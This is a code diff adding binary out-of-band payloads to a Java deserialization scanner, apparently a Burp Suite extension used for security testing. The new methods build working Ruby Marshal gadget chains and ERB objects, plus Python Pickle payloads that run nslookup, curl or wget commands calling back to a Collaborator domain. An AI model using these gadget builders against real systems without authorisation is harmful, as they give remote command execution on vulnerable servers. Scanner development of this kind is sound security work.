@@ -14,6 +14,7 @@ import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
 
+import java.io.ByteArrayOutputStream;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
@@ -2078,6 +2079,337 @@ public class DeserializationScanner implements ScanModule {
                 perHostDelay();
             }
         }
+
+        // ==================== BINARY OOB PAYLOADS ====================
+        // For formats where Collaborator URL must be embedded in binary structures.
+        // These are built dynamically since binary length-prefixed fields can't use string replacement.
+
+        if ("Ruby".equals(dp.language)) {
+            // Ruby Marshal binary payloads — for apps using Marshal.load (not YAML.load)
+            String[][] rubyBinaryOob = {
+                    {"gemsource", "Ruby Marshal Gem::Source @uri"},
+                    {"erb_nslookup", "Ruby Marshal ERB nslookup"},
+                    {"erb_curl", "Ruby Marshal ERB curl"},
+                    {"gadget_nslookup", "Ruby Marshal Gadget chain nslookup"},
+                    {"gadget_curl", "Ruby Marshal Gadget chain curl"},
+                    {"gadget_wget", "Ruby Marshal Gadget chain wget"},
+            };
+
+            for (String[] rb : rubyBinaryOob) {
+                String type = rb[0];
+                String technique = rb[1];
+
+                AtomicReference<HttpRequestResponse> binarySentRequest = new AtomicReference<>();
+                String collabDomain = collaboratorManager.generatePayload(
+                        "deser-scanner", url, dp.name,
+                        "Deser OOB " + technique,
+                        interaction -> {
+                            oobConfirmedParams.add(dp.name);
+                            findingsStore.addFinding(Finding.builder("deser-scanner",
+                                            "Ruby Deserialization RCE (Out-of-Band, Marshal binary)",
+                                            Severity.CRITICAL, Confidence.CERTAIN)
+                                    .url(url).parameter(dp.name)
+                                    .evidence("Technique: " + technique
+                                            + " | Collaborator " + interaction.type().name()
+                                            + " interaction from " + interaction.clientIp())
+                                    .description("Ruby deserialization RCE confirmed via Burp Collaborator. "
+                                            + "Marshal.load processed the binary gadget chain and triggered "
+                                            + "a " + interaction.type().name() + " callback. "
+                                            + "Remediation: Use JSON.parse or YAML.safe_load instead of Marshal.load.")
+                                    .requestResponse(binarySentRequest.get())
+                                    .build());
+                            api.logging().logToOutput("[Deser OOB] Confirmed! Ruby Marshal binary " + technique
+                                    + " at " + url + " param=" + dp.name);
+                        }
+                );
+                if (collabDomain == null) continue;
+
+                byte[] binaryPayload;
+                switch (type) {
+                    case "gemsource":
+                        binaryPayload = buildMarshalObject("Gem::Source",
+                                new String[]{"@uri"},
+                                new String[]{"http://" + collabDomain + "/gem"});
+                        break;
+                    case "erb_nslookup":
+                        binaryPayload = buildMarshalObject("ERB",
+                                new String[]{"@src", "@filename"},
+                                new String[]{"<%= `nslookup " + collabDomain + "` %>", "(erb)"});
+                        break;
+                    case "erb_curl":
+                        binaryPayload = buildMarshalObject("ERB",
+                                new String[]{"@src", "@filename"},
+                                new String[]{"<%= `curl http://" + collabDomain + "/erb` %>", "(erb)"});
+                        break;
+                    case "gadget_nslookup":
+                        binaryPayload = buildMarshalGadgetChain("nslookup " + collabDomain);
+                        break;
+                    case "gadget_curl":
+                        binaryPayload = buildMarshalGadgetChain("curl http://" + collabDomain + "/rce");
+                        break;
+                    case "gadget_wget":
+                        binaryPayload = buildMarshalGadgetChain("wget http://" + collabDomain + "/rce");
+                        break;
+                    default:
+                        continue;
+                }
+
+                if (binaryPayload.length == 0) continue;
+                String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
+
+                // Send base64 (primary — cookie values are typically base64-encoded Marshal)
+                HttpRequestResponse result = sendPayload(original, dp, base64Payload);
+                binarySentRequest.set(result);
+                perHostDelay();
+
+                // Also try URL-encoded base64
+                sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
+                perHostDelay();
+            }
+        }
+
+        if ("Python".equals(dp.language)) {
+            // Python Pickle protocol 2 binary payloads — for apps expecting binary pickle
+            String[][] pythonBinaryOob = {
+                    {"os", "system", "nslookup ", "Pickle P2 nslookup"},
+                    {"os", "system", "curl http://", "Pickle P2 curl"},
+                    {"os", "system", "wget http://", "Pickle P2 wget"},
+                    {"subprocess", "check_output", "nslookup ", "Pickle P2 subprocess nslookup"},
+            };
+
+            for (String[] pb : pythonBinaryOob) {
+                String module = pb[0];
+                String function = pb[1];
+                String cmdPrefix = pb[2];
+                String technique = pb[3];
+
+                AtomicReference<HttpRequestResponse> binarySentRequest = new AtomicReference<>();
+                String collabDomain = collaboratorManager.generatePayload(
+                        "deser-scanner", url, dp.name,
+                        "Deser OOB " + technique,
+                        interaction -> {
+                            oobConfirmedParams.add(dp.name);
+                            findingsStore.addFinding(Finding.builder("deser-scanner",
+                                            "Python Deserialization RCE (Out-of-Band, Pickle binary)",
+                                            Severity.CRITICAL, Confidence.CERTAIN)
+                                    .url(url).parameter(dp.name)
+                                    .evidence("Technique: " + technique
+                                            + " | Collaborator " + interaction.type().name()
+                                            + " interaction from " + interaction.clientIp())
+                                    .description("Python deserialization RCE confirmed via Burp Collaborator. "
+                                            + "pickle.loads() processed the binary payload and executed the command, "
+                                            + "triggering a " + interaction.type().name() + " callback. "
+                                            + "Remediation: Use json.loads() or yaml.safe_load(). Never unpickle untrusted data.")
+                                    .requestResponse(binarySentRequest.get())
+                                    .build());
+                            api.logging().logToOutput("[Deser OOB] Confirmed! Python Pickle binary " + technique
+                                    + " at " + url + " param=" + dp.name);
+                        }
+                );
+                if (collabDomain == null) continue;
+
+                String fullArg = cmdPrefix.contains("http://")
+                        ? cmdPrefix + collabDomain + "/pickle"
+                        : cmdPrefix + collabDomain;
+                byte[] binaryPayload = buildPickleProtocol2(module, function, fullArg);
+                if (binaryPayload.length == 0) continue;
+
+                String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
+                HttpRequestResponse result = sendPayload(original, dp, base64Payload);
+                binarySentRequest.set(result);
+                perHostDelay();
+
+                sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
+                perHostDelay();
+            }
+        }
+    }
+
+    // ==================== BINARY PAYLOAD BUILDERS ====================
+
+    /**
+     * Encode integer in Ruby Marshal v4.8 format.
+     */
+    private static byte[] marshalInt(int n) {
+        if (n == 0) return new byte[]{0};
+        if (n > 0 && n <= 122) return new byte[]{(byte)(n + 5)};
+        if (n > 0 && n <= 255) return new byte[]{1, (byte) n};
+        if (n > 0 && n <= 65535) return new byte[]{2, (byte)(n & 0xff), (byte)((n >> 8) & 0xff)};
+        return new byte[]{4, (byte)(n & 0xff), (byte)((n >> 8) & 0xff),
+                (byte)((n >> 16) & 0xff), (byte)((n >> 24) & 0xff)};
+    }
+
+    /**
+     * Build a Ruby Marshal v4.8 object with string instance variables.
+     * Constructs: \x04\x08 o :className ivarCount [:ivarName I"value encoding]...
+     */
+    private static byte[] buildMarshalObject(String className, String[] ivarNames, String[] ivarValues) {
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            out.write(new byte[]{0x04, 0x08}); // Marshal header v4.8
+            out.write('o'); // Object
+
+            // Class name symbol
+            byte[] classBytes = className.getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(classBytes.length));
+            out.write(classBytes);
+
+            // Instance variable count
+            out.write(marshalInt(ivarNames.length));
+
+            // Each ivar
+            for (int i = 0; i < ivarNames.length; i++) {
+                // Ivar name symbol
+                byte[] nameBytes = ivarNames[i].getBytes(StandardCharsets.US_ASCII);
+                out.write(':');
+                out.write(marshalInt(nameBytes.length));
+                out.write(nameBytes);
+
+                // String value with UTF-8 encoding tag
+                byte[] valBytes = ivarValues[i].getBytes(StandardCharsets.UTF_8);
+                out.write('I'); // Ivar container
+                out.write('"'); // Raw string
+                out.write(marshalInt(valBytes.length));
+                out.write(valBytes);
+                // 1 encoding ivar: E = true (UTF-8)
+                out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
+            }
+            return out.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    /**
+     * Build a Ruby Marshal v4.8 Gem::Requirement → Gem::DependencyList → Gem::StubSpecification chain.
+     * This is the classic auto-trigger gadget: StubSpecification.loaded_from triggers Kernel.open()
+     * when the requirement is compared or inspected.
+     */
+    private static byte[] buildMarshalGadgetChain(String command) {
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            out.write(new byte[]{0x04, 0x08}); // Header
+
+            // Outer: Gem::Requirement object
+            out.write('o');
+            byte[] reqClass = "Gem::Requirement".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(reqClass.length));
+            out.write(reqClass);
+            out.write(marshalInt(1)); // 1 ivar
+
+            // @requirements = [Gem::DependencyList]
+            byte[] reqIvar = "@requirements".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(reqIvar.length));
+            out.write(reqIvar);
+
+            // Array of 1 element
+            out.write('[');
+            out.write(marshalInt(1));
+
+            // Inner: Gem::DependencyList
+            out.write('o');
+            byte[] depClass = "Gem::DependencyList".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(depClass.length));
+            out.write(depClass);
+            out.write(marshalInt(1)); // 1 ivar
+
+            // @specs = [StubSpecification]
+            byte[] specsIvar = "@specs".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(specsIvar.length));
+            out.write(specsIvar);
+
+            // Array of 1 element
+            out.write('[');
+            out.write(marshalInt(1));
+
+            // Innermost: Gem::StubSpecification
+            out.write('o');
+            byte[] stubClass = "Gem::StubSpecification".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(stubClass.length));
+            out.write(stubClass);
+            out.write(marshalInt(2)); // 2 ivars
+
+            // @loaded_from = "|command" (triggers Kernel.open)
+            byte[] loadedIvar = "@loaded_from".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(loadedIvar.length));
+            out.write(loadedIvar);
+            byte[] cmdBytes = ("| " + command).getBytes(StandardCharsets.UTF_8);
+            out.write('I');
+            out.write('"');
+            out.write(marshalInt(cmdBytes.length));
+            out.write(cmdBytes);
+            out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
+
+            // @name = "x" (any value)
+            byte[] nameIvar = "@name".getBytes(StandardCharsets.US_ASCII);
+            out.write(':');
+            out.write(marshalInt(nameIvar.length));
+            out.write(nameIvar);
+            byte[] nameVal = "x".getBytes(StandardCharsets.UTF_8);
+            out.write('I');
+            out.write('"');
+            out.write(marshalInt(nameVal.length));
+            out.write(nameVal);
+            out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
+
+            return out.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    /**
+     * Build Python Pickle protocol 2 payload: module.function(arg)
+     */
+    private static byte[] buildPickleProtocol2(String module, String function, String arg) {
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            out.write(new byte[]{(byte) 0x80, 0x02}); // Protocol 2 header
+            // GLOBAL: push module.function
+            out.write(('c' + module + "\n" + function + "\n").getBytes(StandardCharsets.US_ASCII));
+            out.write('('); // MARK
+            out.write('X'); // BINUNICODE
+            byte[] argBytes = arg.getBytes(StandardCharsets.UTF_8);
+            // 4-byte little-endian length
+            out.write(argBytes.length & 0xff);
+            out.write((argBytes.length >> 8) & 0xff);
+            out.write((argBytes.length >> 16) & 0xff);
+            out.write((argBytes.length >> 24) & 0xff);
+            out.write(argBytes);
+            out.write(new byte[]{'t', 'R', '.'}); // TUPLE, REDUCE, STOP
+            return out.toByteArray();
+        } catch (Exception e) {
+            return new byte[0];
+        }
+    }
+
+    /**
+     * Send a binary OOB payload with Collaborator tracking.
+     * Handles Collaborator generation, callback registration, and encoding (base64 + URL-encoded).
+     */
+    private void sendBinaryOobPayload(HttpRequestResponse original, DeserPoint dp, String url,
+                                       byte[] binaryPayload, String technique) throws InterruptedException {
+        if (binaryPayload == null || binaryPayload.length == 0) return;
+
+        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
+        // No separate collab needed — URL is already embedded in the binary
+        String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
+
+        // Send base64 (primary — most deser expects base64)
+        HttpRequestResponse result = sendPayload(original, dp, base64Payload);
+        sentRequest.set(result);
+        perHostDelay();
+
+        // Also try URL-encoded base64
+        sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
+        perHostDelay();
     }
 
     // ==================== HELPERS ====================
